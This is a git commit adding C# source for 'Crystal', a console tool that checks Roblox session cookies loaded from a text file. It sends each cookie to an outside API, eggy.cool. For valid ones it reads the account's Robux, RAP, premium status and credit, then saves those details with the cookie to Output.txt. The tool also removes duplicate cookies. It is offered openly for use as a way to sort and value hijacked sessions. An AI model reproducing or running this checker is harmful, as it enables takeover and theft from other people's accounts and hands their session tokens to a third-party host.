6c21324c11800b5fc001f8fe61659106afe776d6
Talal <69878842+Talool965@users.noreply.github.com>
2023-08-07 05:37:26 +0300

    Add files via upload

---
+++ Crystal/Program.cs
@@ -0,0 +1,210 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Threading;
+using System.Net;
+using System.IO;
+
+namespace Crystal
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+
+            //STRINGS and modules
+            string creator = "@9upq | https://github.com/talool965";
+            string verison = "1.0.0";
+            Modules Get = new Modules();
+            Modules.ValidFile();
+            string API = "https://eggy.cool/userinfo?cookie=";
+            string GetDirectory = System.IO.File.ReadAllText(@"Config\CookiesDirectory.ini");
+            if (GetDirectory.Contains("DEFAULT"))
+            {
+                GetDirectory = "Cookies.txt";
+
+            }
+
+            string cookies = GetDirectory;
+            //DETECT IF THE WEBSERVER IS ON?\\
+            Console.Title = "CRYSTAL [●]";
+            try
+            {
+                WebClient client = new WebClient();
+                client.DownloadString(API);
+            }
+            catch (Exception)
+            {
+                Console.Title = "CRYSTAL [API-FAILURE]";
+                Console.ReadKey();
+            }
+            //---END---\\
+
+
+            try
+            {
+                //CountLINES
+                Console.Title = "CRYSTAL [●●]";
+                Modules GetMod = new Modules();
+                Modules.ReadCookies();
+
+            }
+            catch (Exception)
+            {
+                string time = DateTime.Now.ToString("h:mm:ss tt");
+                Console.Title = "CRYSTAL [ERRORDETECTED]";
+                Console.ForegroundColor = ConsoleColor.Yellow;
+                Console.Write($"[{time}]");
+                Console.ResetColor();
+                Console.ForegroundColor = ConsoleColor.Cyan;
+                Console.Write(" CRYSTAL CONSOLE: ");
+                Console.ResetColor();
+                Console.Write("No valid cookies file");
+                Console.ResetColor();
+                Console.Write(" exist would you like to ");
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.Write("ROLL BACK");
+                Console.ResetColor();
+                Console.Write(" to the old settings?");
+
+
+                Console.ForegroundColor = ConsoleColor.Green;
+                Console.Write(" Y");
+                Console.ResetColor();
+                Console.ForegroundColor = ConsoleColor.Yellow;
+                Console.Write("/");
+                Console.ResetColor();
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.Write("N");
+                Console.WriteLine();
+                Console.ResetColor();
+                string YN = Console.ReadLine();
+
+                if (YN.Equals("Y"))
+                {
+                    if (File.Exists("Cookies.txt"))
+                    {
+                        //DOnothing
+                    }
+                    else
+                    {
+                        File.Create("Cookies.txt");
+                    }
+                    System.IO.File.WriteAllText(@"Config\CookiesDirectory.ini", "DEFAULT");
+
+                    Console.ForegroundColor = ConsoleColor.Green;
+                    Console.ForegroundColor = ConsoleColor.Yellow;
+                    Console.Write($"[{time}]");
+                    Console.ResetColor();
+                    Console.ForegroundColor = ConsoleColor.Cyan;
+                    Console.Write(" CRYSTAL CONSOLE: ");
+                    Console.ResetColor();
+                    Console.ForegroundColor = ConsoleColor.Green;
+                    Console.Write("Settings has been restored!");
+                    Console.ResetColor();
+                    Thread.Sleep(700);
+                    Environment.Exit(1);
+
+                }
+                else if (YN.Equals("N"))
+                {
+                    Console.WriteLine("Exiting..");
+                    Thread.Sleep(100);
+                    Environment.Exit(0);
+
+                }
+                else
+                {
+                    Console.WriteLine("INVALID OPTION");
+                    Thread.Sleep(200);
+                    Environment.Exit(0);
+
+                }
+
+            }
+
+
+
+            string file = new StreamReader(cookies).ReadToEnd();
+            string[] lines = file.Split('\n');
+            int CountCookies = lines.GetLength(0);
+            Thread.Sleep(200);
+            Console.Title = "CRYSTAL [●●●]";
+            Console.ForegroundColor = ConsoleColor.Yellow;
+            Console.WriteLine(@"   ___                           _  ");
+            Console.WriteLine(@"  / (_)                         | | ");
+            Console.WriteLine(@" |      ,_          , _|_  __,  | | ");
+            Console.WriteLine(@" |     /  |  |   | / \_|  /  |  |/  ");
+            Console.WriteLine(@"  \___/   |_/ \_/|/ \/ |_/\_/|_/|__/");
+            Console.WriteLine(@"                /|                  ");
+            Console.WriteLine(@"                \|                ");
+            Console.WriteLine();
+            Console.WriteLine($"Made by {creator}");
+            Console.ResetColor();
+            Thread.Sleep(200);
+            Console.Title = "CRYSTAL [●●●●]";
+
+            Console.Title = $"CRYSTAL | COOKIESLOADED [{CountCookies}] | VERISON: {verison} ALPHA | [{creator}]";
+
+            Console.ForegroundColor = ConsoleColor.Yellow;
+            Console.WriteLine();
+            Console.WriteLine();
+            Console.WriteLine("[1] Basic cookie checker [PROXYLESS]");
+            Console.WriteLine("[2] Remove Duplicates");
+            Console.WriteLine("[3] ProxyChecker");
+            Console.WriteLine("[4] Settings");
+            Console.ResetColor();
+
+            try
+            {
+
+                //Writing//
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.Write("\r\n>> ");
+                Console.ResetColor();
+                int option = int.Parse(Console.ReadLine());
+
+                switch (option)
+                {
+
+                    case 1:
+                        Console.Clear();
+                        Modules.cookiechecker();
+                        break;
+
+                    case 2:
+                        Console.Clear();
+                        Modules.RemoveDuplicates();
+                        break;
+                    case 3:
+                        Console.Clear();
+                        Modules.ProxyChecker();
+                        break;
+                    case 4:
+                        Modules.settings();
+                        Console.Clear();
+                        break;
+
+                }
+
+            }
+            catch (Exception)
+            {
+                string time = DateTime.Now.ToString("h:mm:ss tt");
+
+                Console.ForegroundColor = ConsoleColor.Yellow;
+                Console.Write($"[{time}]");
+                Console.ResetColor();
+                Console.ForegroundColor = ConsoleColor.Cyan;
+                Console.Write(" CRYSTAL CONSLOE: ");
+                Console.ResetColor();
+                Console.ForegroundColor = ConsoleColor.White;
+                Console.Write("INVALID INPUT");
+                Console.ReadKey();
+
+            }
+        }
+    }
+}
---
+++ Crystal/modules.cs
@@ -0,0 +1,344 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Reflection;
+using System.Text;
+using System.Text.RegularExpressions;
+using System.Threading.Tasks;
+
+namespace Crystal
+{
+    internal class Modules
+    {
+        public static void ReadCookies()
+        {
+            string GetDirectory = System.IO.File.ReadAllText(@"Config\CookiesDirectory.ini");
+            if (GetDirectory.Contains("DEFAULT"))
+            {
+                GetDirectory = "Cookies.txt";
+
+            }
+
+            string cookies = GetDirectory;
+
+            string file = new StreamReader(cookies).ReadToEnd();
+            string[] lines = file.Split('\n');
+            int CountCookies = lines.GetLength(0);
+            File.WriteAllText(@"Config\cache.bin", $"{CountCookies}");
+
+            //---END----
+        }
+
+        public static void ValidFile()
+        {
+            string time = DateTime.Now.ToString("h:mm:ss tt");
+
+            if (File.Exists(@"Config\AutoRemoveDuplicates.ini"))
+            {
+                //OK
+            }
+            else
+            {
+                Console.Title = "CRYSTAL [MISSING-FILE]";
+                Console.ForegroundColor = ConsoleColor.Yellow;
+                Console.Write($"[{time}]");
+                Console.ResetColor();
+                Console.ForegroundColor = ConsoleColor.Cyan;
+                Console.Write(" CRYSTAL CONSOLE: ");
+                Console.ResetColor();
+                Console.Write("File ");
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.Write("AutoRemoveDuplicates.ini");
+                Console.ResetColor();
+                Console.Write(" does not exist if this issue persist please reinstall crystal files");
+                Console.ReadKey();
+                Console.Clear();
+            }
+
+            if (File.Exists(@"Config\CookiesDirectory.ini"))
+            {
+                //OK
+            }
+            else
+            {
+                Console.Title = "CRYSTAL [MISSING-FILE]";
+                Console.ForegroundColor = ConsoleColor.Yellow;
+                Console.Write($"[{time}]");
+                Console.ResetColor();
+                Console.ForegroundColor = ConsoleColor.Cyan;
+                Console.Write(" CRYSTAL CONSOLE: ");
+                Console.ResetColor();
+                Console.Write("File ");
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.Write("CookiesDirectory.ini");
+                Console.ResetColor();
+                Console.Write(" does not exist if this issue persist please reinstall crystal files");
+                Console.ReadKey();
+                Console.Clear();
+            }
+
+        }
+
+        public static void cookiechecker()
+        {
+
+
+
+            try
+            {
+                string GetDirectory = System.IO.File.ReadAllText(@"Config\CookiesDirectory.ini");
+                if (GetDirectory == "DEFAULT")
+                {
+                    GetDirectory = "Cookies.txt";
+
+                }
+
+                string cookies = GetDirectory;
+
+                string file = new StreamReader(cookies).ReadToEnd();
+                string[] lines = file.Split('\n');
+                int CountCookies = lines.GetLength(0);
+
+
+                for (int iv = 0; iv < 1; iv++)
+                {
+                    int totalrobux = 0;
+                    int totalRap = 0;
+                    int close = CountCookies;
+
+                    File.WriteAllText("output.txt", "");
+
+                    //INALIDS COUNTER 
+                    int i = 0;
+
+                    WebClient client = new WebClient();
+                    Console.Title = $"CRYSTAL | COOKIES LOADED [{CountCookies}] | TOTAL ROBUX [0] | TOTAL RAP [0] | INVALIDS [{i}]";
+                    List<string> allLines = new List<string>();
+                    using (StreamReader reader = new StreamReader(GetDirectory))
+                    {
+
+                        string line;
+                        while ((line = reader.ReadLine()) != null)
+                        {
+                            string time = DateTime.Now.ToString("h:mm:ss tt");
+                            allLines.Add(line);
+                            string api = client.DownloadString($"https://eggy.cool/userinfo?cookie={line}");
+
+                            var USERID = Regex.Match(api, $"\"userid\": (.+?),").Groups[1].Value;
+                            var USERNAME = Regex.Match(api, $"\"username\": (.+?),").Groups[1].Value;
+                            var ROBUX = Regex.Match(api, $"\"robux\": (.+?),").Groups[1].Value;
+                            var RAP = Regex.Match(api, $"\"rap\": (.+?),").Groups[1].Value;
+                            var PREMIUM = Regex.Match(api, $"\"premium\": (.+?),").Groups[1].Value;
+                            var CREDIT = Regex.Match(api, $"\"credit\": (.+?),").Groups[1].Value;
+                            var PENDINGROBUX = Regex.Match(api, $"\"pendingrobux\": (.+?),").Groups[1].Value;
+                            var DOC = Regex.Match(api, $"\"datecreated\": (.+?),").Groups[1].Value;
+                            var EMAILVERIFIED = Regex.Match(api, $"\"emailverified\": (.+?),").Groups[1].Value;
+
+
+                            if (api.Contains("good"))
+                            {
+
+                                totalrobux = totalrobux + int.Parse(ROBUX);
+                                totalRap = totalRap + int.Parse(RAP);
+                                Console.Title = $"CRYSTAL | COOKIES LOADED [{CountCookies}] | TOTAL ROBUX [{totalrobux}] | TOTAL RAP [{totalRap}] | INVALIDS [{i}]";
+                                Console.ForegroundColor = ConsoleColor.Yellow;
+                                Console.Write($"[{time}]");
+                                Console.ResetColor();
+                                Console.ForegroundColor = ConsoleColor.Cyan;
+                                Console.Write(" CRYSTAL CHECKER: ");
+                                Console.ResetColor();
+                                Console.Write($"ID :{USERID} | USERNAME: {USERNAME} | ROBUX {ROBUX} | RAP: {RAP} | PREMIUM: {PREMIUM} | CREDIT: {CREDIT} | PENDINGROBUX: {PENDINGROBUX} | DOC: {DOC} | EMAILVERIFIED: {EMAILVERIFIED}");
+
+
+                                File.AppendAllText("Output.txt", $"ID :{USERID} | USERNAME: {USERNAME} | ROBUX {ROBUX} | RAP: {RAP} | PREMIUM: {PREMIUM} | CREDIT: {CREDIT} | PENDINGROBUX: {PENDINGROBUX} | DOC: {DOC} | EMAILVERIFIED: {EMAILVERIFIED} | COOKIE: {line}" + Environment.NewLine);
+                                Console.WriteLine("");
+                            }
+                            else
+                            {
+
+
+
+
+                                Console.ForegroundColor = ConsoleColor.Yellow;
+                                Console.Write($"[{time}]");
+                                Console.ResetColor();
+                                Console.ForegroundColor = ConsoleColor.Cyan;
+                                Console.Write(" CRYSTAL CHECKER: ");
+                                Console.ResetColor();
+                                Console.ForegroundColor = ConsoleColor.Red;
+                                Console.Write("INVALID COOKIE");
+                                //ADD 1 TO INVALIDS COUNTER
+                                i++;
+                                Console.Title = $"CRYSTAL | COOKIES LOADED [{CountCookies}] | TOTAL ROBUX [{totalrobux}] | TOTAL RAP [{totalRap}] | INVALIDS [{i}]";
+                                Console.WriteLine();
+                            }
+
+                        }
+                    }
+
+
+                }
+
+
+            }
+            catch (Exception)
+            {
+                Console.WriteLine();
+                string time = DateTime.Now.ToString("h:mm:ss tt");
+                Console.ForegroundColor = ConsoleColor.Yellow;
+                Console.Write($"[{time}]");
+                Console.ResetColor();
+                Console.ForegroundColor = ConsoleColor.Cyan;
+                Console.Write(" CRYSTAL CONSOLE: ");
+                Console.ResetColor();
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.Write("Crystal crashed");
+                Console.ReadKey();
+            }
+
+
+        }
+        public static void RemoveDuplicates()
+        {
+            try
+            {
+                Console.Clear();
+                Console.ForegroundColor = ConsoleColor.Yellow;
+                Console.WriteLine(@"   ___                           _  ");
+                Console.WriteLine(@"  / (_)                         | | ");
+                Console.WriteLine(@" |      ,_          , _|_  __,  | | ");
+                Console.WriteLine(@" |     /  |  |   | / \_|  /  |  |/  ");
+                Console.WriteLine(@"  \___/   |_/ \_/|/ \/ |_/\_/|_/|__/");
+                Console.WriteLine(@"                /|                  ");
+                Console.WriteLine(@"                \|                ");
+                Console.ResetColor();
+                Console.WriteLine();
+                string GetDirectory = System.IO.File.ReadAllText(@"Config\CookiesDirectory.ini");
+                if (GetDirectory.Contains("DEFAULT"))
+                {
+                    GetDirectory = "Cookies.txt";
+
+                }
+
+                string[] lines = File.ReadAllLines(GetDirectory);
+                File.WriteAllLines("Output.txt", lines.Distinct().ToArray());
+                string time = DateTime.Now.ToString("h:mm:ss tt");
+                Console.ForegroundColor = ConsoleColor.Yellow;
+                Console.Write($"[{time}]");
+                Console.ResetColor();
+                Console.ForegroundColor = ConsoleColor.Cyan;
+                Console.Write(" CRYSTAL CONSOLE: ");
+                Console.ResetColor();
+                //
+                int count = File.ReadAllLines(GetDirectory).Length;
+                int count2 = File.ReadAllLines("Output.txt").Length;
+                int total = count - count2;
+
+                Console.Write($"Removed");
+                Console.ForegroundColor = ConsoleColor.Yellow;
+                Console.Write($" {total}");
+                Console.ResetColor();
+                Console.Write($" duplicate cookies successfully and saved them to ");
+                Console.ForegroundColor = ConsoleColor.Yellow;
+                Console.Write("Output.txt");
+
+                var info = Console.ReadKey();
+                if (info.Key == ConsoleKey.Enter)
+                {
+                    var fileName = Assembly.GetExecutingAssembly().Location;
+                    System.Diagnostics.Process.Start(fileName);
+                }
+            }
+            catch
+            (Exception)
+            {
+                string time = DateTime.Now.ToString("h:mm:ss tt");
+                Console.ForegroundColor = ConsoleColor.Yellow;
+                Console.Write($"[{time}]");
+                Console.ResetColor();
+                Console.ForegroundColor = ConsoleColor.Cyan;
+                Console.Write(" CRYSTAL CONSOLE: ");
+                Console.ResetColor();
+                Console.Write("ERROR 300 COULD NOT REMOVE DUPLICATE FILES.");
+            }
+
+        }
+
+        public static void ProxyChecker()
+        {
+            Console.Clear();
+            Console.ForegroundColor = ConsoleColor.Yellow;
+            Console.WriteLine(@"   ___                           _  ");
+            Console.WriteLine(@"  / (_)                         | | ");
+            Console.WriteLine(@" |      ,_          , _|_  __,  | | ");
+            Console.WriteLine(@" |     /  |  |   | / \_|  /  |  |/  ");
+            Console.WriteLine(@"  \___/   |_/ \_/|/ \/ |_/\_/|_/|__/");
+            Console.WriteLine(@"                /|                  ");
+            Console.WriteLine(@"                \|                ");
+            Console.ResetColor();
+            Console.WriteLine();
+
+            string time = DateTime.Now.ToString("h:mm:ss tt");
+            Console.ForegroundColor = ConsoleColor.Yellow;
+            Console.Write($"[{time}]");
+            Console.ResetColor();
+            Console.ForegroundColor = ConsoleColor.Cyan;
+            Console.Write("CRYSTAL CONSOLE: ");
+            Console.ResetColor();
+            Console.Write("FEATURE IS CURRENTLY DISABLED");
+            var info = Console.ReadKey();
+            if (info.Key == ConsoleKey.Enter)
+            {
+                var fileName = Assembly.GetExecutingAssembly().Location;
+                System.Diagnostics.Process.Start(fileName);
+            }
+        }
+        public static void settings()
+        {
+            try
+            {
+                Console.Clear();
+                Console.ForegroundColor = ConsoleColor.Yellow;
+                Console.WriteLine(@"   ___                           _  ");
+                Console.WriteLine(@"  / (_)                         | | ");
+                Console.WriteLine(@" |      ,_          , _|_  __,  | | ");
+                Console.WriteLine(@" |     /  |  |   | / \_|  /  |  |/  ");
+                Console.WriteLine(@"  \___/   |_/ \_/|/ \/ |_/\_/|_/|__/");
+                Console.WriteLine(@"                /|                  ");
+                Console.WriteLine(@"                \|                ");
+                Console.ResetColor();
+                Console.WriteLine();
+
+                string time = DateTime.Now.ToString("h:mm:ss tt");
+                Console.ForegroundColor = ConsoleColor.Yellow;
+                Console.Write($"[{time}]");
+                Console.ResetColor();
+                Console.ForegroundColor = ConsoleColor.Cyan;
+                Console.Write("[1] CRYSTAL SETTINGS: ");
+                Console.ResetColor();
+                Console.Write("UNDERDEVELOPMENT");
+                var info = Console.ReadKey();
+                if (info.Key == ConsoleKey.Enter)
+                {
+                    var fileName = Assembly.GetExecutingAssembly().Location;
+                    System.Diagnostics.Process.Start(fileName);
+                }
+
+
+            }
+            catch (Exception)
+            {
+                string time = DateTime.Now.ToString("h:mm:ss tt");
+                Console.ForegroundColor = ConsoleColor.Yellow;
+                Console.Write($"[{time}]");
+                Console.ResetColor();
+                Console.ForegroundColor = ConsoleColor.Cyan;
+                Console.Write(" CRYSTAL CONSOLE: ");
+                Console.ResetColor();
+                Console.Write("ERROR 300 COULD NOT REMOVE DUPLICATE FILES.");
+            }
+        }
+    }
+}
